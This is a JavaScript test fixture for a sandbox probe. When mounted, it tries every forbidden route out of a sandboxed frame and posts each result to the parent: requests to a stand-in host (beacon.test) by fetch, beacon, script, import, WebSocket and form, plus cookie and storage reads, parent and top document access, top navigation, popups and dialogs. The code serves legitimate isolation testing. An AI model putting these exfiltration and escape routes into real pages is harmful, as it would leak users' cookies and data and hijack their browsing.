// A foreign effect that tries everything an effect must not, for the sandbox
// probe: requests to an outside address by every route, the page's cookies
// and storage, the page's document, top navigation, popups, dialogs and a
// form. Each attempt's outcome is posted to the parent window -- the one
// channel a sandboxed frame keeps -- so the probe can report it; the probe's
// own evidence is what reached its router, the page's cookie, storage and
// address, popups and dialogs.
const BEACON = 'https://beacon.test/';
const results = {};
const wait = (ms) => new Promise((done) => setTimeout(done, ms));
const attempt = async (name, run) => {
  try {
    const value = await Promise.race([run(), wait(1500).then(() => 'timed out')]);
    results[name] = `returned ${value === null ? 'null' : typeof value === 'object' ? (value.constructor?.name ?? 'object') : String(value).slice(0, 60)}`;
  } catch (error) {
    results[name] = `threw ${error?.name ?? 'error'}`;
  }
};
const loads = (element, attach) => new Promise((done, fail) => {
  element.onload = () => done('loaded');
  element.onerror = () => fail(new Error('error event'));
  attach(element);
});

async function hostile(host) {
  await attempt('fetch', () => fetch(`${BEACON}fetch`, {mode: 'no-cors'}));
  await attempt('xhr', () => new Promise((done, fail) => {
    const request = new XMLHttpRequest();
    request.open('GET', `${BEACON}xhr`);
    request.onload = () => done('loaded');
    request.onerror = () => fail(new Error('error event'));
    request.send();
  }));
  await attempt('websocket', () => new Promise((done, fail) => {
    const socket = new WebSocket('wss://beacon.test/ws');
    socket.onopen = () => done('open');
    socket.onerror = () => fail(new Error('error event'));
  }));
  await attempt('eventsource', () => new Promise((done, fail) => {
    const source = new EventSource(`${BEACON}events`);
    source.onopen = () => done('open');
    source.onerror = () => { source.close(); fail(new Error('error event')); };
  }));
  await attempt('sendBeacon', () => navigator.sendBeacon(`${BEACON}beacon`, 'stolen'));
  await attempt('image', () => loads(new Image(), (image) => { image.src = `${BEACON}image`; host.append(image); }));
  await attempt('script', () => loads(document.createElement('script'), (script) => { script.src = `${BEACON}script.js`; document.head.append(script); }));
  await attempt('stylesheet', () => loads(document.createElement('link'), (link) => { link.rel = 'stylesheet'; link.href = `${BEACON}sheet.css`; document.head.append(link); }));
  await attempt('cssUrl', async () => { host.style.backgroundImage = `url(${BEACON}css)`; await wait(300); return 'set'; });
  await attempt('import', () => import(`${BEACON}module.js`));
  await attempt('iframe', async () => { const frame = document.createElement('iframe'); frame.src = `${BEACON}frame`; document.body.append(frame); await wait(300); return 'appended'; });
  await attempt('worker', () => new Worker(URL.createObjectURL(new Blob([`fetch('${BEACON}worker')`], {type: 'text/javascript'}))));
  await attempt('cookieRead', () => document.cookie);
  await attempt('cookieWrite', () => { document.cookie = 'stolen=1'; return document.cookie; });
  await attempt('localStorage', () => { localStorage.setItem('stolen', '1'); return localStorage.getItem('stolen'); });
  await attempt('sessionStorage', () => { sessionStorage.setItem('stolen', '1'); return sessionStorage.getItem('stolen'); });
  await attempt('indexedDB', () => new Promise((done, fail) => {
    const request = indexedDB.open('stolen');
    request.onsuccess = () => done('opened');
    request.onerror = () => fail(new Error('error event'));
  }));
  await attempt('parentDocument', () => parent.document.title);
  await attempt('topDocument', () => window.top.document.cookie);
  await attempt('parentStorage', () => parent.localStorage.getItem('own'));
  await attempt('frameElement', () => window.frameElement);
  await attempt('open', () => window.open(`${BEACON}popup`));
  await attempt('alert', () => alert('hostile'));
  await attempt('confirm', () => confirm('hostile'));
  await attempt('prompt', () => prompt('hostile'));
  await attempt('form', async () => {
    const form = document.createElement('form');
    form.action = `${BEACON}form`;
    form.method = 'post';
    document.body.append(form);
    form.submit();
    await wait(300);
    return 'submitted';
  });
  await attempt('topNavigation', async () => { top.location = `${BEACON}top`; await wait(300); return 'assigned'; });
  await attempt('topNavigationHref', async () => { window.top.location.href = `${BEACON}top-href`; await wait(300); return 'assigned'; });
  parent.postMessage({sfSandboxProbe: 'hostile', results}, '*');
}

export function mount(host) {
  const canvas = document.createElement('canvas');
  canvas.style.cssText = 'position:absolute;inset:0;inline-size:100%;block-size:100%';
  host.append(canvas);
  const draw = canvas.getContext('2d');
  canvas.width = 40;
  canvas.height = 40;
  draw.fillStyle = '#400010';
  draw.fillRect(0, 0, 40, 40);
  hostile(host);
  return {update() {}, pause() {}, resume() {}, destroy() { canvas.remove(); }};
}
